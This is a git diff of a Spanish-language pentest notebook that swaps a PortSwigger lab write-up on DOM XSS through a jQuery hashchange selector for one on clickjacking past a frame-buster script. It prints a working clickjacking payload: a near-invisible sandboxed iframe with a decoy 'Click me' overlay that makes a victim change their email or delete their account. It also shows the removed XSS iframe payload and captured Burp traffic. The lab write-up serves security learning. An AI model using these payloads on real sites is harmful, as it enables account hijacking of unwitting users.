@@ -4,7 +4,7 @@
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-### AUDITORIA DE: ((Laboratorio: DOM XSS en el receptor del selector jQuery usando un evento hashchange))
+### AUDITORIA DE: ((Laboratorio: Clickjacking con un script de destrucción de fotogramas))
 
 ***
 
@@ -15,19 +15,24 @@
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
+    BROWSER VEMOS EL SCRIPT QUE ROMPE LOS FOTOGRAMAS DE IFRAME COMO MEDIDAD E SEGURIDAD:
+
     SCRIPT:
+    
 
-
-    $(window).on('hashchange', function(){
-        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + 
-    ')');
-        if (post) post.get(0).scrollIntoView();
-    });
+    <script>
+                                if(top != self) {
+                                    window.addEventListener("DOMContentLoaded", function() {
+                                        document.body.innerHTML = 'This page cannot be framed';
+                                    }, false);
+                                }
+    </script>
     ```
 
-    ![DOM-XSSenSelectorEventoHASHCHANGE](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/a170860c-2a92-4d05-ad6e-8c8978af4742)
+    ![CLICKHACKINGconCSRF_y_FRAME-BUSTERvemos_el_script](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/1d9a2cdb-8114-47bc-8cfd-d7476812f460)
 
-    * CONCLUSION: ENCONTRAMOS EN EL HTML DEL HOME EL SCRIPT QUE MANEJA EL SELECTOR JQUERY EN EL EVENTO HASHCHANGE.
+    
+    * CONCLUSION: VEMOS EL SCRIPT QUE ROMPE LOS FOTOGRAMAS DE IFRAME COMO MEDIDAD E SEGURIDAD, OSEA UN FRAME BUSTER.
 
 ***
 
@@ -1259,13 +1264,35 @@
 
 #### SCRIPT DE EXPLOIT Y PAYLOADS
 
-*   [x] PORTSWIGGER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] PROPIO👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    <iframe src="https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-    ```
+    PAYLOAD PARA ELUDIR FRAME BUSTER:
 
-    * CONCLUSION:NO SE TERMINO DE COMPRENDER BIEN LA EJECUCION; PERO TUVIMOS QUE MANDAR ESTA CARGA UTIL DESDE NEUSTRO SERVIDOR MALISIOSO A LA VICTIMA Y A ESTA SE ELE EJECUTARIA LAS OPCIONES DE IMPRECION DE LA URL INDICADA EN SRC Y NADAD MAS; SE COMPLICO HASTA QUE AL FIN LO TOMO EL LABORATORIO, LUEGO DE PROBAR MUCHAS CARGAS POR NUESTRA CUENTA.
+
+
+    <style>
+        iframe {
+            position:relative;
+            width:700px;
+            height: 500px;
+            opacity: 0.001;
+            z-index: 2;
+        }
+        div {
+            position:absolute;
+            top:450px;
+            left:70px;
+            z-index: 1;
+        }
+    </style>
+    <div>Click me</div>
+    <iframe src="https://0a940015040ace43812993bb00720010.web-security-academy.net/my-account?email=paimonMALISIOSO@hotmail.com" sandbox="allow-forms"></iframe>
+    ```
+    ![CLICKHACKINGconCSRF_y_FRAME-BUSTERvemos_el_IFRAME_CARGADO_ELUDIENDO_script_CON_SANDBOX_parametro](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/01b01ac6-c9a1-4296-8a56-3b3e7e8a8b84)
+
+
+    * CONCLUSION:RESOLVIMOS LA CARGA DEL IFRAME DE SITIO DE LA CUENTA DEL USUARIO (YA CON NUESTRO MAIL MALISIOSO CARGADO EN EL PARAMETRO DE CAMBIO DE MAIL) "UTILIZANDO EL PARAMETRO SANDBOX CON EL VALOR ALLOW-FORM PARA PODER SALTEAR LA MEDIDA DE SEGURIDAD DEL SCRIPT FRAME BUSTER QUE NO DEJABA CARGAR LOS IFRAME COMO MEDIDA DE SEGURIDAD" CUANDO ESTE HAGA CLICK EN EL LINK DEL EXPLOIT, y LO VIMOS EN EL RESPONSE EL VALUE CARGADO CON NUESTRO MAIL MALISIOOSO.  LUEGO DE COLOCAR NUESTRO BOTON PARA QUE SE PRODUSCA EL CLICKHACKING DEL USUARIO PENSANDO QUE ESTA HACIENDO CLICK EN ALGUN OTRO BODY QUE LE PONGAMOS DE FONDO (EJEMPLO UN PREMIO CON UN SUPUESTO BOTON EN EL DIV, QUE NOSOTROS ACOMODAMOS CON SU POSITION SOBRE EL IFRAME DEL ACOUNT DEL SITIO WEB QUE AL HACER CLICK EN EL LINK L USUARIO LO LLEVARA DIRECTAMENTE A SU ACOUNT OSEA A SU PERFIL DADO QUE SERIA COMO UNA RUTA RLATIVA QUE SE CARGARA CON SU PERFIL POR QUE  EL Y AESTARIA CON SUS COOKIES; Y COMO NOSOSTROS POSICIONAMOS NEUSTRO DIV (BOTON) SIMULANDO SER UN PREMIO, SOBRE EL BOTON DE ELIMINAR CUENTA DE SU PERFIL; EL MISMO SIN DARCE CUENTA ESTARA HACIENDO CLICK ELIMINANDOCE EL MISMO, EXPLOTANDOCE ESTA VULNERABILIDAD DE CLICKHACKING CON CSRF DADO QUE SE ESTA CARGANDO DEL LADO DEL USUARIO VICTIMA EN EL IFRAME DEL SITIO.
 
 ***
 
@@ -1284,58 +1311,58 @@
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
-    REQUEST NORMAL :
+    REQUEST CAMBIO DE MAIL:
 
 
 
-
-    GET /post?postId=5 HTTP/2
-    Host: 0a96001003dc9730810d5ce400eb00b6.web-security-academy.net
-    Cookie: session=hrpstTIw3ZNzjsMATxZisZXH5xrq9PVC
-    Cache-Control: max-age=0
-    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
-    Sec-Ch-Ua-Mobile: ?0
-    Sec-Ch-Ua-Platform: "Linux"
-    Upgrade-Insecure-Requests: 1
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-    Sec-Fetch-Site: same-origin
-    Sec-Fetch-Mode: navigate
-    Sec-Fetch-User: ?1
-    Sec-Fetch-Dest: document
-    Referer: https://0a96001003dc9730810d5ce400eb00b6.web-security-academy.net/
+    POST /my-account/change-email HTTP/2
+    Host: 0a940015040ace43812993bb00720010.web-security-academy.net
+    Cookie: session=bZmNNsbTM6Ww8AKbzscVRqw9xBeSV2cC
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate, br
-    Accept-Language: es-419,es;q=0.9,en;q=0.8
-
-
-
-
-
-    RESPONSE NORMAL:
-
-
-
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 64
+    Origin: https://0a940015040ace43812993bb00720010.web-security-academy.net
+    Referer: https://0a940015040ace43812993bb00720010.web-security-academy.net/my-account?id=wiener
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    
+    email=P4IM0N%40hotmail.com&csrf=APKfxIKYZFAOcpPazixrDg9CRkAVi4dS
+    
+    
+    
+    
+    
+    RESPONSE CAMBIO DE MAIL:
+    
+    
     HTTP/2 200 OK
     Content-Type: text/html; charset=utf-8
-    Content-Length: 7088
-
+    Cache-Control: no-cache
+    Content-Length: 6668
+    
     <!DOCTYPE html>
     <html>
         <head>
             <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
-            <link href=/resources/css/labsBlog.css rel=stylesheet>
-            <title>DOM XSS in jQuery selector sink using a hashchange event</title>
+            <link href=/resources/css/labs.css rel=stylesheet>
+            <title>Clickjacking with a frame buster script</title>
         </head>
         <body>
             <script src="/resources/labheader/js/labHeader.js"></script>
             <div id="academyLabHeader">
-                <section class='academyLabBanner'>
+                <section class='academyLabBanner is-solved'>
                     <div class=container>
                         <div class=logo></div>
                             <div class=title-container>
-                                <h2>DOM XSS in jQuery selector sink using a hashchange event</h2>
-                                <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ae00026033497c481d25bd20118000d.exploit-server.net'>Go to exploit server</a>
-                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event'>
+                                <h2>Clickjacking with a frame buster script</h2>
+                                <a class=link-back href='https://portswigger.net/web-security/clickjacking/lab-frame-buster-script'>
                                     Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                     <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                         <g>
@@ -1345,71 +1372,75 @@
                                     </svg>
                                 </a>
                             </div>
-                            <div class='widgetcontainer-lab-status is-notsolved'>
+                            <div class='widgetcontainer-lab-status is-solved'>
                                 <span>LAB</span>
-                                <p>Not solved</p>
+                                <p>Solved</p>
                                 <span class=lab-status-icon></span>
                             </div>
                         </div>
                     </div>
                 </section>
+                <section id=notification-labsolved class=notification-labsolved>
+                    <div class=container>
+                        <h4>Congratulations, you solved the lab!</h4>
+                        <div>
+                            <span>
+                                Share your skills!
+                            </span>
+                            <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aClickjacking+with+a+frame+buster+script%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fclickjacking%2flab-frame-buster-script&related=WebSecAcademy,Burp_Suite'>
+                        <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
+                            <title>twitter-button</title>
+                            <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
+                        </svg>
+                            </a>
+                            <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fclickjacking%2flab-frame-buster-script'>
+                        <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                            <title>linkedin-button</title>
+                            <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
+                        </svg>
+                            </a>
+                            <a href='https://portswigger.net/web-security/clickjacking/lab-frame-buster-script'>
+                                Continue learning 
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                    </div>
+                </section>
             </div>
-            <div theme="blog">
+            <div theme="">
                 <section class="maincontainer">
                     <div class="container is-page">
                         <header class="navigation-header">
                             <section class="top-links">
                                 <a href=/>Home</a><p>|</p>
+                                <a href="/my-account?id=wiener">My account</a><p>|</p>
+                                <a href="/logout">Log out</a><p>|</p>
                             </section>
                         </header>
                         <header class="notification-header">
                         </header>
-                        <div class="blog-post">
-                        <img src="/image/blog/posts/57.jpg">
-                        <h1>Swipe Left Please</h1>
-                        <p><span id=blog-author>Scott Com</span> | 12 February 2024</p>
-                        <hr>
-                        <p>I don&apos;t know if you&apos;ve ever been on a dating site, but if you&apos;re female I&apos;d suggest you don&apos;t waste your time. And trust me, if you think by paying for a subscription you&apos;ll get a better selection of potential suitors, think again.</p>
-                        <p>The gallery of images looks like those books they whip out in CSI, a book of mugshots so a witness can identify the perpetrator. Honestly, they all look like convicts, mostly serial killers. I physically recoiled when I started browsing through. I don&apos;t want to appear mean, but I&apos;m thinking if you&apos;re looking to attract a female; a shave, maybe a shower, would be the right step before taking that selfie. And what&apos;s with the ski wear? Head covered, eyes covered by goggles, what are they trying to hide? If they think they look worse than the others, and are in disguise, I don&apos;t want to invite them to take the ski gear off.</p>
-                        <p>I took an unflattering photo, not easy for me as I&apos;m a big fan of the beauty filter. But, I was only there to see what goes on behind the scenes. My profile information offered up the bare minimum to meet the required word count. And yet, within the space of 5 minutes, I&apos;d had 25 views, one message, and a wink. That to me screams desperate. Trust me, my profile didn&apos;t suggest I was much of a catch.</p>
-                        <p>I couldn&apos;t read the message, if I wanted to I needed to put my hand in my wallet. I was teased with the first few words. It read, &apos;I can&apos;t because I&apos;m on a free trial&apos;. What a tight ass. If you want to communicate with me, don&apos;t send me a message I can&apos;t read so I have to shell out the money.</p>
-                        <p>There was a small part of me that momentarily thought it was a little bit exciting, and I might find a knight in shining armor. But not to be, 8 minutes in and I deleted my account.</p>
-                        <div/>
-                        <hr>
-                        <h1>Comments</h1>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            El Bow | 20 February 2024
-                            </p>
-                            <p>Could you do a blog on the needy? I want to show my husband he&apos;s always whining about nothing.</p>
-                            <p></p>
-                        </section>
-                        <section class="comment">
-                            <p>
-                            <img src="/resources/images/avatarDefault.svg" class="avatar">                            Peg Up | 01 March 2024
-                            </p>
-                            <p>I can&apos;t say I&apos;m surprised you wrote this.</p>
-                            <p></p>
-                        </section>
-                        <hr>
-                        <section class="add-comment">
-                            <h2>Leave a comment</h2>
-                            <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
-                                <input required type="hidden" name="csrf" value="Uy0SoJbkY9bWyecJrRz9nESJsH3BfCuB">
-                                <input required type="hidden" name="postId" value="5">
-                                <label>Comment:</label>
-                                <textarea required rows="12" cols="300" name="comment"></textarea>
-                                        <label>Name:</label>
-                                        <input required type="text" name="name">
-                                        <label>Email:</label>
-                                        <input required type="email" name="email">
-                                        <label>Website:</label>
-                                        <input pattern="(http:|https:).+" type="text" name="website">
-                                <button class="button" type="submit">Post Comment</button>
+                        <h1>My Account</h1>
+                        <div id=account-content>
+                            <p>Your username is: wiener</p>
+                            <p>Your email is: <span id="user-email">P4IM0N@hotmail.com</span></p>
+                            <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
+                                <label>Email</label>
+                                <input required type="email" name="email" value="">
+                                <script>
+                                if(top != self) {
+                                    window.addEventListener("DOMContentLoaded", function() {
+                                        document.body.innerHTML = 'This page cannot be framed';
+                                    }, false);
+                                }
+                                </script>
+                                <input required type="hidden" name="csrf" value="APKfxIKYZFAOcpPazixrDg9CRkAVi4dS">
+                                <button class='button' type='submit'> Update email </button>
                             </form>
-                        </section>
-                        <div class="is-linkback">
-                            <a href="/">Back to Blog</a>
                         </div>
                     </div>
                 </section>
@@ -1420,8 +1451,7 @@
     </html>
     ```
 
-    * CONCLUSION: NO SE OBSERVA NADA.
-
+    * CONCLUSION: SOLO CORROVORAMOS EN LAS SOLICITUDES LOS PARAMETROS QUE DEVEMOS USAR.
 ***
 
 ***
